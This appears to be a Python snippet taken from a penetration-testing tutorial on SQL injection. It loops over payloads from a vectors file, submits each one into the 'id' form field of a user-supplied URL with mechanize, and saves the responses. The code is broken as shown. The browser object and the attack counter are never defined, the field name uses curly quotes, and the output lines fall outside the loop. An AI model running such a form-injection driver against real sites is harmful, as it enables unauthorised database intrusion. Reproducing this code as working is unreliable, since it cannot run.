# https://www.tutorialspoint.com/python_penetration_testing/python_penetration_testing_sqli_web_attack.htm
# Date: N/A

import mechanize

url = input("Enter the full url")

with open ("vectors.txt") as v:
    for line in v:
        browser.open(url)
        browser.select_form(nr = 0)
        browser[“id”] = line
        res = browser.submit()

content = res.read()
output = open("response/" + str(attack_no) + ".txt", "w")
output.write(content)
output.close()
print(attack_no)
attack_no += 1